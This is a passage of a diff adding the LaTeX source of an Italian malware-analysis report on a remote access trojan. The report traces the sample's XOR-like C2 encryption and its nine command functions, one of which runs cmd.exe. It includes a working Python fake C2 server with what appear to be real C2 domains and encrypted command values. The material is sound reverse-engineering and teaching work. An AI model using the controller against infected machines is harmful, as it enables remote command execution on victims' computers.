+                        \item Si è tentato anche con RC4, ma senza risultati.
+
+                        \item Sono stati effettuati altri tentativi con decifratori online ma senza alcun risultato
+                    \end{itemize}
+
+                \item Si prova a cercare l'utilizzo di librerie/implementazioni esterne
+                
+                    E' stato settato un breakpoint in memory access alle pagine del processo nella quale è
+                    mappata la dll CRYPTBASE, magari il malware usa le 
+                    \href{https://learn.microsoft.com/it-it/windows/win32/seccrypto/cryptoapi-system-architecture}
+                    {CryptoAPI di Microsoft}, in particolare la funzione \href{https://learn.microsoft.com/it-it/
+                    windows/win32/api/wincrypt/nf-wincrypt-cryptencrypt}{\texttt{CryptEncrypt}}. Il breakpoint
+                    viene triggerato per l'accesso a \href{https://learn.microsoft.com/it-it/windows/win32/api/ntsecapi/nf-ntsecapi-rtlgenrandom}{\texttt{CRYPTBAS.SystemFunction036}} che è un random number
+                    generator. Per il resto, nulla.
+
+                    Di altre librerie tipo OpenSSL, GnuTLS, \dots non c'è traccia
+                    \pic{cryptlib}{CRYPTBASE.dll}{10cm}{4cm}
+            \end{enumerate}
+
+            Molto probabilmente, l'algoritmo è scritto ad-hoc per il malware. Capire come funzioni non è semplice
+            anche perchè il codice stesso implementa meccanismi di obfsucation che rendono impossibile tenere traccia della routine di encrypt/decrypt, o tantomeno localizzare da dove inizia a dove finisce.
+
+            Cercando di capire cosa facesse il malware, si è notato come quando si usa \texttt{Set-Cookie}
+            appaia frequentemente la stringa:
+
+            \pic{freqstr}{Stringa (sospetta cleartext da cifrare)}{14cm}{5cm}
+
+            Ad un certo punto, tra i vari breakpoint settati:
+
+            \pic{strarg}{\texttt{lpParameter} di \texttt{CreateThread}}{15cm}{3.5cm}
+
+            In EAX, c'è proprio il puntatore alla stringa indicata in figura \ref{fig:freqstr} che viene passata come argomento
+            a una procedura da far eseguire a un thread con \texttt{CreateThread}.
+
+            Se si osserva la shell di python del server TCP (o netcat o altri) in connessione col malware (debuggato, subisce breakpoint/pause/step over/\dots), risulta che \underline{immediatamente}
+            dopo aver fatto step over la \texttt{WaitForSingleObject} del thread corrispondente (QUESTO appena creato da QUESTA \texttt{CreateThread}), la \texttt{recv} del server che prima era in attesa, riceve i dati cifrati 
+            (\texttt{fipng=\dots}).
+
+            Probabilmente questo nuovo thread si occupa di:
+            \begin{enumerate}
+                \item cifrare una stringa in input
+                \item forgiare la richiesta HTTP POST
+                \item aprire una nuova connessione TCP
+                \item scrivere sul socket la richiesta
+            \end{enumerate}
+
+            \underline{\textbf{Come si è dedotto che il valore di \texttt{Set-Cookie} è una chiave di cifratura?}}
+
+            \begin{itemize}
+                \item \textbf{Lunghezze del ciphertext e cleartext sono uguali(A e B corrispondono ai char non printabili della stringa datetime)}:
+
+                    \pic{ce_cmp}{\texttt{len(.)} uguali}{17cm}{4cm}
+
+                \pagebreak
+
+                \item \textbf{Differenze di due ciphertext generati a partire da due stringhe cleartext della
+                    stessa natura(data e ora visti prima in figura \ref{fig:freqstr}), a parità di chiave di cifratura}:
+
+                    \pic{diffs}{Differenze}{16cm}{5cm}
+
+                    La stringa cleartext è \texttt{"[MM-DD-YYYY HH:mm:SS]ABABAB"} e gli indici dei byte
+                    cambiati del ciphertext coincidono con i minuti e i secondi che differiscono per via dei
+                    due istanti diversi di generazione della stringa cleartext data e ora.
+
+                \item \textbf{Cambiando chiave di cifratura (cambiando il valore di \texttt{Set-Cookie}) 
+                    il ciphertext cambia completamente, e \texttt{Set-Cookie} può essere qualunque valore,
+                    anche tasti premuti completamente a caso sulla tastiera.}
+
+                    Risposta HTTP dal server al malware:
+
+                    \begin{lstlisting}
+HTTP/1.1 200 OK\r\n
+Connection: keep-alive\r\n
+Content-Length: 4\r\n
+Set-Cookie: onekey\r\n       %%%%% dopo sara cambiato il valore a "ifbeuyv" %%%%%
+\r\n
+rand
+                    \end{lstlisting}
+
+                    Osservando il valore della stringa puntata da EAX (cleartext), nel momento in cui si trova al breakpoint in figura 
+                    \ref{fig:strarg} e il corrispondente ciphertext inviato dal malware al server:
+
+                    \pic{pt0}{Cleartext primo istante}{10cm}{1.5cm}
+                    \pic{ct0}{Ciphertext primo istante, chiave: \texttt{onekey}}{10cm}{2cm}
+                    
+                    \pic{pt1}{Cleartext secondo istante}{10cm}{1.5cm}
+                    \pic{ct1}{Ciphertext secondo istante, chiave \underline{uguale}: \texttt{onekey}}{10cm}{2cm}
+
+                    I cambiamenti che si notano tra i ciphertext (fig. \ref{fig:ct0} e \ref{fig:ct1}) sono proprio in corrispondenza dei diversi
+                    minuti e secondi dei due rispettivi cleartext (fig. \ref{fig:pt0} e \ref{fig:pt1}).
+
+                    \pic{pt2}{Cleartext terzo istante}{10cm}{1.5cm}
+                    \pic{ct2}{Ciphertext terzo istante, chiave \underline{diversa}: \texttt{ifbeuyv}}{10cm}{2cm}
+
+                    E oltretutto, anche con chiave diversa, la \underline{lunghezza del ciphertext è sempre
+                    uguale a quella del cleartext}
+                \item \textbf{Per richieste GET del malware al server successive, a parità di chiave e con
+                    i valori della figura \ref{fig:httpget_after} cerchiati che cambiano continuamente, il ciphertext
+                    rimane uguale (cambiano solo i byte in corrispondenza dei min e sec, in accordo con quanto visto sopra. Quindi il ciphertext non dipende da quei valori che cambiano, ma solo da \texttt{Set-Cookie})}
+
+                    L'esempio del punto precedente, ha generato più richieste GET da parte del malware, 
+                    si avranno quindi differenze tra i due valori cerchiati in figura \ref{fig:httpget_after}
+                    nelle due richieste una dopo l'altra. Il ciphertext, tuttavia, cambia radicalmente \underline{solo}
+                    al cambiare della chiave in \texttt{Set-Cookie} e non con il cambio dei due valori cerchiati.
+                    
+                \item \textbf{Localizzazione funzione/thread che si occupa di effettuare la cifratura,
+                    modificarne il cleartext in input e ottenere in risposta GET dal malware al server un ciphertext 
+                    completamente diverso}. Come visto in figura \ref{fig:strarg}, la freccia indica l'argomento
+                    che la \texttt{CreateThread} passa alla funzione che verrà invocata dal thread appena creato.
+                    Nella successiva sezione, \ref{sect:msgxchg}, si dimostra che cambiando la stringa puntata
+                    da EAX (plaintext da cifrare), anche l'output del malware (il ciphertext) cambia totalmente. E' evidente sopratutto
+                    in funzione della lunghezza del ciphertext rispetto al cleartext da cifrare modificato.
+            \end{itemize}
+            
+            Si può affermare con una certa sicurezza
+            che l'algoritmo di cifratura non sia qualcosa di estremamente complesso (sicuramente basato su XOR) - implementare AES (o anche
+            3DES, \dots) "a mano" è sicuramente molto complesso, c'è possibilità di introdurre vulnerabilità e 
+            sopratutto c'è un incremento di grandezza del malware non da poco. 
+
+            Invece che ricostruire l'algoritmo effettuando un lavoro di reversing, \textbf{si utilizza il 
+            debugger con il malware per fargli cifrare le stringhe che poi dal server gli saranno inviate}
+
+            \subsubsection{Scambiare dati (significativi) col malware}\label{sect:msgxchg}
+            
+            Il server sceglie con \texttt{Set-Cookie} la encryption key: server e malware scambiano dati cifrati 
+            (server $\rightarrow$ malware e viceversa) 
+            con uno stesso algoritmo di cifratura e un unica chiave scelta dal server.
+
+            Inviando dati (da server a malware, per dati intendiamo l'HTTP body della risposta alla GET del 
+            malware) "cleartext" di qualsiasi lunghezza non ha effetti particolari se non l'invio della solita
+            stringa che, è semplicemente data e ora cifrati.
+
+            \textbf{Dato che non riusciamo a capire il funzionamento dell'algoritmo di crittografia, sfruttiamo il debugger
+            per far si che il malware cifri le stringhe al posto nostro}: quindi con stessa encryption key, si
+            può riinviare al malware il ciphertext ottenuto nella prossima richiesta POST del malware al server (nell'HTTP body) quindi possiamo avere la speranza di inviare del ciphertext da server a malware che rappresenti un comando da far eseguire e che quindi dia la possibilità di scoprire cosa
+            effettivamente faccia il malware.
+            
+            Dopo l'invio di risposta HTTP da parte del server con qualsiasi comando non valido, al raggiungimento
+            del breakpoint in figura \ref{fig:strarg}:
+
+            \pic{followdump}{Indirizzo in EAX al breakpoint in figura \ref{fig:strarg}}{8cm}{5cm}
+
+            \pic{edit}{Binary edit della stringa da cifrare (cleartext originale, stringa datetime)}{12cm}{5cm}
+
+            \pic{edit_after}{Post-edit, stringa NUL-terminated puntata da EAX (cleartext modificato, 
+            stringa \texttt{test})}{12cm}{3cm}
+
+            \pagebreak
+
+            Si ottiene quindi, nella richiesta HTTP POST da malware a server, il corrispondente ciphertext della stringa cleartext \texttt{"test"} editata dal debugger manualmente:
+            
+            \pic{enc_after_edit}{Stringa \texttt{test} cifrata}{19cm}{5.5cm}
+
+            Quindi, invieremo da ora in poi una risposta HTTP server $\rightarrow$ malware tipo (
+            copiando HTTP body indicato in figura \ref{fig:enc_after_edit})
+
+            \begin{lstlisting}
+HTTP/1.1 200 OK\r\n
+Content-Length: 8\r\n
+Connection: keep-alive\r\n
+Set-Cookie: data\r\n
+\r\n
+1+BZbg==                      %%%%% copiato dalla richiesta POST del malware %%%%%
+            \end{lstlisting}
+
+            Ovvero, usando le stringhe che il malware ha cifrato per nostro conto.
+            
+            Ovviamente, senza uno stralcio di documentazione / sorgente e in più codice offuscato, risulta
+            difficile capire quali siano i comandi da inviare.
+
+            \subsubsection{Scoprire i comandi del malware}
+            
+            Vari tentativi (di inviare comandi cifrati,
+            si veda la sezione \ref{sect:msgxchg}, tipo "run", "RUN", "Run", cmd", "CMD", "Cmd", "exec", "EXEC", 
+            "Exec", \dots) sono risultati sempre
+            nello stesso esito, evidente osservando come al solito la stringa puntata dal registro EAX al 
+            raggiungimento del breakpoint in figura \ref{fig:strarg} (risultato dopo l'esecuzione del comando - non valido - inviato) - sempre data e ora - ovvero la stessa
+            risposta ottenuta mandando dati a caso.
+
+            L'ultima cosa logica era pensare che a ogni comando corrispondesse numero che lo indicasse e quindi cifrare
+            '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', "10", "11", \dots e poi riinviarlo al malware,
+            nella speranza di generare una risposta che sia diversa dalla stringa datetime solita.
+            
+            Ha senso anche perchè riduce la lunghezza del messaggio al minimo indispensabile e non c'è un
+            chiaro collegamento tra numero e comando eseguito (un comando "run" può essere al numero 0 come al
+            9), rendendo più difficile l'analisi.
+            
+            \subsubsection*{Esempio cifratura comando \texttt{"0"}}
+
+            \pic{ptexample}{Cleartext da modificare}{15cm}{2cm}
+            \pic{ptchngexample}{Modifica dall'inizio, includo il NUL-terminator per l'enc. algo.}{15cm}{5cm}
+            \pic{ptafterexample}{L'enc. algo. si ferma al NUL-terminator}{10cm}{2cm}
+            La stringa NUL-terminated "0" viene cifrata dal malware (dopo resume execution), ottenendola dalla solita 
+            richiesta GET da quest'ultimo al server\dots
+            \pic{ctexample}{Ciphertext corrispondente a '0' cifrato con \texttt{somekey}}{13cm}{3cm}
+            \pic{ctb64dexample}{Singolo byte ciphertext \texttt{0x80} (non-printable) corrisp. a cleartext \texttt{0x30}, decodificato da base64}{9cm}{2cm}
+
+            Il ciphertext in figura \ref{fig:ctexample} lo copio nella risposta HTTP (body) dal server al malware. Quest'ultimo eseguirà la funzione richiesta e potrò analizzare l'output del comando (cleartext) dalla stringa
+            puntata da EAX (debugger, figura \ref{fig:strarg}), prima di essere cifrata e inviata al server.
+
+            Faccio la stessa cosa per '1', '2', '3', \dots
+
+            \subsubsection*{Procedendo con l'analisi}
+            
+            Il comando '0' restituisce (per restituisce si intende la stringa puntata da EAX al breakpoint in figura \ref{fig:strarg}) sempre la solita stringa datetime.
+
+            Dopo aver cifrato '1', come nelle figure \ref{fig:followdump}, \ref{fig:edit}, \ref{fig:edit_after} e
+            \ref{fig:enc_after_edit} e più specificatamente \ref{fig:ptexample}, \ref{fig:ptchngexample},
+            \ref{fig:ptafterexample}, \ref{fig:ctexample} e \ref{fig:ctb64dexample}, copio il 
+            ciphertext corrispondente a '1' (analogo figura \ref{fig:ctexample} che era per '0', in questo caso 
+            per '1') nella risposta HTTP da server a malware\dots
+
+            \begin{lstlisting}
+HTTP/1.1 200 OK\r\n
+Content-Length: 4\r\n
+Connection: keep-alive\r\n
+Set-Cookie: somekey\r\n
+\r\n
+gQ==
+            \end{lstlisting}
+
+            \dots e la invio.
+
+            Sempre allo stesso breakpoint (figura \ref{fig:strarg}), il valore che assume EAX è il puntatore che 
+            punta alla stringa che da esito della funzione del malware eseguita.
+
+            \pic{fn1}{Prima funzione (\textit{"paramup"})}{19cm}{2cm}
+
+            \pic{fn1enc}{Prima funzione, output esecuzione ciphertext (non serve)}{19cm}{2cm}
+
+            Faccio la stessa cosa con '2','3', \dots, '9', \dots:
+
+            \pic{fn2}{Seconda funzione (\textit{"setinterval"})}{19cm}{2cm}
+
+            La terza funzione è più particolare perchè l'output sembra indicare che sia un comando non valido (ricordando che la stringa datetime veniva restituita anche per comandi completamente a caso),
+            però un breakpoint settato in precedenza su una riga sulla quale OllyDbg indica la stringa UNICODE
+            puntata \texttt{"cmd.exe /u /c \%s"} (indirizzo codice eseguibile: \texttt{XXXX3CCA}) viene 
+            raggiunto nel mezzo dell'esecuzione del comando 3 (\textit{"nel mezzo"}: \underline{dopo} l'invio del comando da 
+            server a malware e \underline{prima} della stringa output puntata da EAX al breakpoint settato in figura \ref{fig:strarg}).
+            
+            Si veda la sezione \ref{sect:dump_analyze}
+            
+            \pic{fn3}{Terza funzione (\textit{"unknown"})}{11.5cm}{1.5cm}
+            \pic{fn4}{Quarta funzione (\textit{"plugindl"})}{19cm}{1.5cm}
+            \pic{fn5}{Quinta funzione (\textit{"update"})}{18cm}{1.5cm}
+
+            Dal momento in cui la stringa è molto lunga, la sesta funzione include informazioni sul 
+            sistema(\textit{"sysinfo"}):
+
+            \texttt{[+] Info: Version 3.0.1, LoggedonUser: ste, Stub Path: C:\textbackslash Users \dots, 
+            Persistence Mode: , Persistence name: , Mutex name: toysegg}
+
+            \pic{fn7}{Settima funzione (\textit{"uninstall"})}{18cm}{2cm}
+            \pic{fn8}{Ottava funzione (\textit{"execdlparam"})}{17cm}{2cm}
+            \pic{fn9}{Nona funzione (\textit{"paramdl"})}{16cm}{2cm}
+
+            \underline{Il resto dei comandi}: 
+            il $10$ è il comando $1$, l'$11$ il $2$, il $12$ il $3$, \dots, il $19$ è 
+            l'$1$, il $20$ il $2$, e cosi via\dots
+
+            In pratica, osservando l'output come nelle figure sopra, si determina che i comandi sono sempre
+            quelli: si ripetono nello stesso ordine.
+
+            Non sappiamo cosa faccia il comando $0$.
+            
+            I comandi validi rientrano nel range $1 \le fn_{NUM} \le 9$.
+
+            Per capire meglio il funzionamento della \textit{terza funzione}, sono stati settati dei breakpoint (fino ad 
+            arrivare al punto importante) sulla base dell'osservazione dell'esecuzione step by step della 
+            terza funzione molteplici volte (inviando il comando più volte, andandone a raffinare sempre
+            di più la conoscenza):
+
+            \begin{enumerate}
+                \item brkp @ \texttt{XXXXD056}: \texttt{CMP DWORD PTR DS:[\dots]\dots} (\textit{Post-      
+                    WaitForSingleObject check})
+                \item brkp @ \texttt{XXXXD7F0}: \texttt{PUSH EBP} (\textit{Inizio function prologue})
+                \item brkp @ \texttt{XXXXBBB0}: \texttt{PUSH EBP} (\textit{Inizio function prologue, fn. executor})
+                \item brkp @ \texttt{XXXXC487}: \texttt{PUSH EAX} (\textit{Inizio push arg. CreateThread})
+                \item brkp @ \texttt{XXXX3B30}: \texttt{PUSH EBP} (\textit{Inizio function prologue del nuovo thread})
+            \end{enumerate}
+
+            La funzione \texttt{XXXXBBB0} è stata indicata come "fn. executor" perchè sono presenti tutta
+            una serie di \texttt{if}s (o \texttt{switch-case}s) che confrontano 0,1,2,3,4,5,6,7,8 (num. di funzione indicato all'inizio del comando). Per ricordare
+            che \textbf{potrebbe} essere la funzione che parsa il comando e quindi fa eseguire la funzionalità
+            corrispondente ad esso, la indichiamo già da ora come "fn. executor".
+
+            Dall'ultimo punto, vari step-over e:
+
+            \begin{enumerate}
+                \item Viene creata una pipe anonima con \href{https://learn.microsoft.com/it-it/windows/win32/api/
+                    namedpipeapi/nf-namedpipeapi-createpipe}{\texttt{CreatePipe}}
+                    \pic{fn3_namedpipe}{Creazione pipe anonima}{17cm}{2.5cm}
+                \item Viene passato il comando da eseguire, la stringa formato \texttt{"cmd.exe /u /c \%s"} il
+                    buffer di destinazione a una \texttt{sprintf}
+                    \pic{fn3_cmd_snprintf}{Funzione sprintf-like}{17cm}{1.5cm}
+                \item Viene passato a \href{https://learn.microsoft.com/it-it/windows/win32/api/processthreadsapi/      
+                        nf-processthreadsapi-createprocessw}{\texttt{CreateProcessW}} 
+                        la stringa appena formattata, gli handle in/out della pipe (tramite \href{https://stackoverflow.com/questions/42402673/createprocess-and-capture-stdout}
+                        {\texttt{STARTUPINFO}})
+                        \pic{fn3_createprocess}{CreateProcessW}{16cm}{4cm}
+                \item  Post-esecuzione, viene letto l'output del comando eseguito
+                    \pic{fn3_readout}{Lettura output processo dalla pipe}{14cm}{3cm}
+            \end{enumerate}
+
+            Quindi concludiamo subito che la funzione numero 3 è per eseguire comandi tramite cmd.exe (\textit{"cmd"})
+            
+            \textbf{Tabella riassuntiva funzionalità del malware}
+
+            \begin{table}[h!]
+            \begin{center}
+            \begin{tabular}{|c|c|c|}
+                \hline
+                \textbf{Num. di funzione} & \textbf{Nome assegnato} & \textbf{Descrizione} \\
+                \hline\hline
+                1 & paramup & ?? \\
+                2 & setinterval & ?? \\
+                \underline{3} & \underline{cmd} & \underline{Esegue comandi con cmd.exe} \\
+                4 & plugindl & ?? \\
+                5 & update &  ?? \\
+                6 & sysinfo & Ottieni informazioni sul sistema e l'installazione del malware\\
+                7 & uninstall & Elimina tracce del malware sul computer e termina proc. corrente\\
+                8 & execdlparam & ?? \\
+                9 & paramdl & ?? \\
+                \hline
+            \end{tabular}
+            \caption{}
+            \label{table:fnlst}
+            \end{center}
+            \end{table}
+
+            \textit{Il nome, per le funzionalità che hanno descrizione ?? è stato assegnato sulla base dell'output
+            cleartext visto dal debugger nelle figure (per esempio la figura \ref{fig:fn1}: "UPload PARAMeter"
+            è facilmente riconducibile a "paramup")}
+
+            La funzionalità più importante è la terza, che permette di eseguire comandi in modo arbitrario sul computer
+            vittima. 
+            
+            \textbf{Il malware è quindi classificabile come RAT (Remote Access Trojan)}
+
+            \subsubsection{Generalità sul parsing della funzionalità da eseguire}
+            
+            Dopo aver parsato la richiesta HTTP, il thread secondario lanciato dal main thread termina.
+            
+            Quindi, dopo la \texttt{WaitForSingleObject} sull'handle del thread secondario, il main thread
+            arriva fino a \texttt{XXXXBBB0} e da li esegue la funzionalità richiesta.
+
+            Non si riesce a capire come vengano codificati gli argomenti passati alla funzionalità: ad esempio
+            \texttt{3,"ping google.com"} o per esempio separando gli argomenti con char non stampabili.
+
+            \subsubsection{Qualcosa in più sul comando 3 "cmd"}\label{sect:moreabt3}
+
+            Non abbiamo la possibilità di sperimentare l'esecuzione del comando direttamente inviandolo dal server,
+            ma possiamo usare OllyDbg per modificare il buffer corrispondente al \texttt{\%s} della stringa
+            formato passata a sprintf (in realtà widechar)
+
+            \pic{chngfmtstr}{\texttt{call} alla \texttt{(w)sprintf}}{18cm}{2cm}
+
+            \pic{chngfmtstr1}{follow in dump}{9cm}{6cm}
+
+            Vogliamo forzare l'esecuzione del comando \texttt{"sc query wuauserv"}, quindi:
+            \pic{chngfmtstr2}{Zona di memoria modificata}{6cm}{2cm}
+
+            Si raggiunge quindi la \texttt{CreateProcessW}
+            
+            \pic{chngfmtstr3}{Argomenti attuali alla \texttt{CreateProcessW}}{10cm}{4cm}
+
+            Dopo la \texttt{CreateProcessW}, il malware esegue una \texttt{Sleep} di un secondo e fa
+            \texttt{ReadFile} sulla anonymous pipe passata al processo child e quindi grazie al funzionamento
+            della \texttt{ReadFile} con le pipe, tramite un loop e condizioni d'uscita opportune, riesce
+            a leggere l'output del comando eseguito.
+
+            \pic{chngfmtstr4}{Argomenti alla \texttt{ReadFile} per la lettura della pipe}{10cm}{4cm}
+
+            Dopo la lettura completa dell'output del comando\dots
+            
+            \pic{chngfmtstr5}{Output comando eseguito}{9.5cm}{6cm}
+
+            Il malware "decora" l'output del comando racchiudendolo tra il solito datetime, segnalazione di inizio output
+            \texttt{"[+] CMD Shell"} e segnalazione fine output \texttt{"[+] Shell execution Success!"}
+
+            \pic{chngfmtstr6}{Cleartext output funzionalità 3 dopo esecuzione comando}{15cm}{2.5cm}
+
+            Il tutto viene cifrato e inviato al server con la solita richiesta POST
+
+            \pic{chngfmtstr7}{Ciphertext output funzionalità 3 dopo cifratura e ricezione da parte del server}{19cm}{3cm}
+
+            \subsubsection{Qualcosa in più sul comando 7 "uninstall"}
+
+            Dato che per eliminare tracce del malware c'è pesante interazione con le WinAPI conviene usare
+            procmon per capire cosa va a disinstallare
+
+            Delete file eseguibile del malware (sample.exe):
+
+            \pic{uninstall1}{Ricezione e delete del file del malware}{19cm}{4cm}
+
+            Terminazione processo corrente:
+
+            \pic{uninstall2}{Terminazione del processo stesso}{19cm}{3cm}
+
+            \pagebreak
+            
+            \section{Simulare server per la comunicazione col malware}
+
+            \begin{lstlisting}[language=Python]
+#!/usr/bin/python3
+
+import socket
+
+# registrazione funzionalita
+# 'func#': ('func name', ('encrypted func# base64'), ('encryption key'))
+#  comandi cifrati ottenuti come descritto nelle sezioni precedenti con la loro
+#  corrispondente encryption key
+
+_CMDS = {
+    '1':('paramup',   ("gQ==", "somekey")),
+    '2':('setinterval',  ("gg==", "somekey")),
+    '3':('cmd',       ("gw==", "somekey")),
+    '4':('plugindl',   ("hA==", "somekey")),
+    '5':('update',   ("hQ==", "somekey")),
+    '6':('sysinfo',   ("hg==", "somekey")),
+    '7':('uninstall', ("hw==", "somekey")),
+    '8':('execdlparam',   ("iA==", "somekey")),
+    '9':('paramdl',   ("iQ==", "somekey"))
+}
+
+# filtraggio: il server mostra la richiesta HTTP solo se e presente l'header
+# specificato dalla coppia presente in lista ('Hdr', 'Val') => 'Hdr': 'Val'
+# Il malware specifica nell'header host quale dei domini sta contattando.
+#
+# perche: ApateDNS effettua DNS "override" di TUTTO il traffico system-wide
+# verso localhost, quindi il server riceve anche richieste che col malware 
+# non c'entrano niente, ad esempio richieste HTTP di Windows Update
+_FILTER_HTTP_HEADER_INCLUDE = [
+    ('Host', 'purewatertokyo.com'),
+    ('Host', 'pinkgoat.com'),
+    ('Host', 'toysbagonline.com'),
+    ('Host', 'yellowlion.com'),
+    ('Host', 'salmonrabbit.com'),
+    ('Host', 'bluecow.com')
+]
+
+# util - lettura dal socket
+def read_all(sck):
+    _BUFSIZE = 8192
+    tmp_buf = sck.recv(_BUFSIZE)
+    buf = tmp_buf
+    while len(tmp_buf) == _BUFSIZE:
+        tmp_buf = sck.recv(_BUFSIZE)
+        buf += tmp_buf
+        tmp_buf = ''
+
+    return buf
+
+# util - costruzione risposta HTTP al malware
+def build_http_res(body, key):
+    return f'HTTP/1.1 200 OK\r\n\
+Content-Length: {len(body)}\r\n\
+Connection: keep-alive\r\n\
+Set-Cookie: {key}\r\n\
+\r\n\
+{body}'
+
+# shell - printa help comandi/funzionalita disponibili
+def print_lscmd():
+    s = "Cmd,BriefDesc,EncryptedBase64,EncryptionKey\n"
+    s += "--------------------------------------------------------\n"
+    
+    for cmd in _CMDS:
+        s += f" {cmd}, {_CMDS[cmd][0]}, {_CMDS[cmd][1][0]}, {_CMDS[cmd][1][1]}\n"
+ 
+    print(s)
+
+# filter - filtraggio basato sugli header delle richieste HTTP
+def filter_http_req(req):
+    for ln in req.split("\r\n"):
+        http_hdr_kvpair = ln.split(":")
+        if len(http_hdr_kvpair) > 1:
+            key = http_hdr_kvpair[0].strip()
+            value = http_hdr_kvpair[1].strip()
+            for hdrentry in _FILTER_HTTP_HEADER_INCLUDE:
+                if key == hdrentry[0] and value == hdrentry[1]:
+                    return req
+                
+    return None
+
+# util - scrittura sul socket
+def issue_remote_cmd(cmd, sock):
+    httpres = build_http_res("","")
+    if cmd != None:
+        httpres = build_http_res(_CMDS[cmd][1][0], _CMDS[cmd][1][1])
+
+    try:
+        sock.send(httpres.encode('utf-8'))
+    except ConnectionResetError:
+        print(" ** remote CLOSED connection")
+        pass
+
+# shell - endless loop con 4 comandi
+def start_interactive_shell(sock):
+    shell_builtin = input("[mal]> ")
+    tokens = shell_builtin.split(' ')
+
+    if tokens[0] == 'lscmd':
+        print_lscmd()
+        return False
+    elif tokens[0] == 'ignore':
+        return True
+    elif tokens[0] == 'empty':
+        issue_remote_cmd(None, sock)
+        return True
+    elif tokens[0] == 'run':
+        if len(tokens) < 2:
+            print(" mal-shell: starting command run requires at least another arg")
+            print(" mal-shell: * run: followed by Cmd (1,2,3,...) listed in lscmd")
+            return False
+
+        for cmd in _CMDS:
+            if cmd == tokens[1]:
+                issue_remote_cmd(cmd, sock)
+                return True
+
+        print(f" mal-shell: run - unknown remote command: \"{tokens[1]}\"")
+        return False
+
+    print(f" mal-shell: unknown starting command \"{tokens[0]}\"")
+    print(" mal-shell: valid starting commands:")
+    print(" mal-shell:  * lscmd: list malware commands")
+    print(" mal-shell:  * ignore: don't send anything, close conn. immediately")
+    print(" mal-shell:  * run: followed by Cmd (1,2,3,...) listed in lscmd")
+    return False
+
+if __name__ == '__main__':
+    laddr = '0.0.0.0'
+    lport = 80
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
+
+    s.bind((laddr, lport))
+    s.listen()
+
+    while True:
+        conn = s.accept()
+        unfiltered_http_req = ''
+
+        try:
+            unfiltered_http_req = read_all(conn[0]).decode('utf-8')
+        except ConnectionResetError:
+            conn[0].close()
+            continue
+        
+        http_req = filter_http_req(unfiltered_http_req)
+        if http_req != None:
+            print(f" ** remote CONNECTED and SENT valid data {conn[1][0]}:{conn[1][1]}")
+            print(http_req)
+
+            # La richiesta POST dal malware al server indica risultato esec. comando.
+            # Alla POST e necessaria una risposta HTTP "vuota" nel body
+            # (in realta potrebbe essere anche piena di dati random...)
+            # altrimenti alla prossima richiesta GET dal malware al server, 
+            # il malware non accettera nemmeno comandi validi (comportamento "strano").
+            # Questo "empty command" permette di resettare 
+            # lo stato del malware in "accettazione di comandi" automaticamente, 
+            # senza doverlo fare manualmente ogni volta (infatti c'e il comando 
+            # non esplicitamente indicato nella shell, "empty" 
+            # in start_interactive_shell -> elif tokens[0] == 'empty' ... 
+            # per eseguire "empty" "a mano")
+            if http_req[:4] == "POST":
+                print(" ** issuing empty command")
+                issue_remote_cmd(None, conn[0])
+            else:
+                while start_interactive_shell(conn[0]) == False:
+                    pass
+
+            print(" ** closing connection")
+
+        conn[0].close()
+            \end{lstlisting}
+
+            \pagebreak
+
+            \section{Analisi statica e dinamica per comprendere le altre funzionalità}
+
+            Dato che non si riesce ad andare oltre con la sola analisi dinamica avanzata, per capire
+            le funzioni rimanenti con descrizione \textit{??} in tabella \ref{table:fnlst}, dobbiamo per forza
+            tornare ad utilizzare Ghidra.
+
+            Effettuo quindi un binary dump da OllyDbg delle pagine che contengono il codice attualmente in esecuzione
+            in Explorer.exe, che sono le pagine etichettate con freccia \textbf{2} in figura 
+            \ref{fig:explorer_pages}: il listing asm associato è quello in figura \ref{fig:explorer_listing}.
+
+            Come ci si era accorti già prima, cercando di capire il funzionamento del comando 3, la
+            funzione \texttt{XXXXBBB0}("fn. executor") contiene al suo interno molte \texttt{cmp} (confronta 0,1,\dots,8).
+            Con le \texttt{cmp}s cerca (o almeno, dovrebbe cercare) il function code passato dal comando.
+
+            Il binary dump è stato effettuato con base address \texttt{04750000}.
+
+            In Ghidra, cerchiamo subito la funzione all'indirizzo \texttt{0000BBB0} (\texttt{
+            GhidraBaseAddress = 00000000}).
+
+            Si ignora per il momento la parte iniziale della funzione,
+
+            \pic{adv_ignore}{Prima parte della funzione ignorata}{13cm}{10cm}
+
+            La parte rilevante:
+
+            \pic{adv_p1}{Il codice cerca la pipe symbol e calcola la len. della command string}{16cm}{6cm}
+
+            \pagebreak
+
+            \underline{\textbf{Importante}}: \textbf{Il commento della figura \ref{fig:adv_p2}
+            dovrebbe essere "Checks if the pipe symbol is NOT present \dots"}
+            
+            \pic{adv_p2}{Caso pipe symbol non presente}{17.5cm}{5cm}
+            
+            \pic{adv_p3}{Caso pipe symbol presente}{17cm}{10cm}
+
+            Quindi gli argomenti copiati nel buffer \texttt{realArgs} sono quelli che cominciano 
+            immediatamente dopo i  leading whitespaces (o carriage returns o newlines):
+
+            \begin{center}
+
+            \texttt{3|\;\;\;\;\;\;\;\;\;\;argstr-argstr-argstr}
+            
+            \texttt{3|argstr-argstr-argstr}
+            
+            \end{center}
+
+            Sempre \texttt{argstr-argstr-argstr} viene estratta e copiata in \texttt{realArgs}.
+            
+            \pic{adv_p4}{Chiamata calcolatore del function code}{16cm}{2.5cm}
+
+            \pic{adv_fncode}{Algoritmo calcolo function code}{17cm}{7cm}
+
+            In sintesi, da queste figure, capiamo come viene calcolato il codice/numero di funzione.
+
+            \begin{lstlisting}[language=Python]
+def get_function_code(fns):
+    x = int(fns)
+
+    if x == 0:
+        x = -1
+    else:
+        x = x % 10000
+        x = (x / 1000 + (x / 100) % 10 + (x / 10) % 10 + x % 10) % 9
+
+    return int(x)
+
+for i in range(12):
+    print(f" get_function_code(\"{i}\") = {get_function_code(str(i))}")
+
+print("etc etc etc...")
+            \end{lstlisting}
+
+            E quindi, l'output:
+
+            \begin{lstlisting}[language=Python]
+ get_function_code("0") = -1
+ get_function_code("1") = 1 # funzionalita 1
+ get_function_code("2") = 2 # funzionalita 2
+ get_function_code("3") = 3 # funzionalita 3
+ get_function_code("4") = 4 # funzionalita 4
+ get_function_code("5") = 5 # funzionailta 5
+ get_function_code("6") = 6 # funzionalita 6
+ get_function_code("7") = 7 # funzoinalita 7
+ get_function_code("8") = 8 # funzoinalita 8
+ get_function_code("9") = 0 # funzionalita 9
+ get_function_code("10") = 1
+ get_function_code("11") = 2
+etc etc etc...
+            \end{lstlisting}
+
